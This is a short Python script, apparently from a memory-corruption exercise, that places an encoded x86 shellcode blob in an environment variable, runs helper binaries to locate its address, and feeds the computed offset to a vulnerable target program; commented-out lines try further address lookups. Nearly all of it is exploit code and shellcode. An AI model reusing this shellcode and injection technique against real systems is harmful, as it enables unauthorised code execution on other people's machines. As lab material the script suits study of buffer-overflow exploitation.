import subprocess
from subprocess import call
from subprocess import check_output
from ctypes import *
import os

shellcode =  ""
shellcode += "\xdb\xd3\xd9\x74\x24\xf4\xb8\x5d\x3a\x1b\xc6\x5e\x2b"
shellcode += "\xc9\xb1\x0a\x31\x46\x19\x83\xee\xfc\x03\x46\x15\xbf"
shellcode += "\xcf\x71\xcd\x67\xa9\xd4\xb7\xff\xe4\xbb\xbe\x18\x9e"
shellcode += "\x14\xb2\x8e\x5f\x03\x1b\x2c\x09\xbd\xea\x53\x9b\xa9"
shellcode += "\xee\x93\x1c\x2a\x9d\xe0\x1c\x7d\x0e\x8f\xfc\x4c\x30"
env_name = "SHELLCODE"
os.environ[env_name] = shellcode

env = (c_char_p * 2)() 
env[0] = "%s=raghas"%env_name
env[1] = '0'
libc = CDLL("libc.so.6")

command = './get_env.out %s ./a.out'%env_name
res = check_output(command, stderr=subprocess.STDOUT, shell=True)
print(res.split('\n')[-3])
diff = int(res.split('\n')[-2])
print(diff)


command = './test.out %d'%diff
res = check_output(command, stderr=subprocess.STDOUT, shell=True)
print(res)

#print("0x%08x"%get_command_address(res))
#print('*************************')
#command = './test.out %d'%get_command_address(res)
#res = check_output(command, stderr=subprocess.STDOUT, shell=True)
#print(res)
#print("0x%08x"%get_command_address(res))
#print('*************************')
#command = './bb.out SHELL ./a.out'
#res = check_output(command, stderr=subprocess.STDOUT, shell=True)
#print("0x%08x"%get_command_address(res))
#cdll.system("./get_env.out MARDAS ./get_env.out")
